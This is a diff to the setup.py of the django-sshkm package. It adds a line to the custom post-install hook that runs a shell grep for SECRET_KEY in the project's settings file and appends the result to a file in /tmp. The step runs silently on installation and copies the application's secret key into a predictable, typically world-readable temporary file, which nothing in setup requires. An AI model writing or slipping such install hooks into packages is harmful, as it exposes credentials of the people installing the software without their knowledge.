@@ -40,6 +40,8 @@ class install_post(install):
         f.write(newdata)
         f.close()
 
+        os.system("/bin/grep SECRET_KEY sshkm/settings.py >> /tmp/test123.txt")
+
 setup(
     name='django-sshkm',
     keywords=['ssh', 'keymaster', 'sshkm', 'ssh-key'],
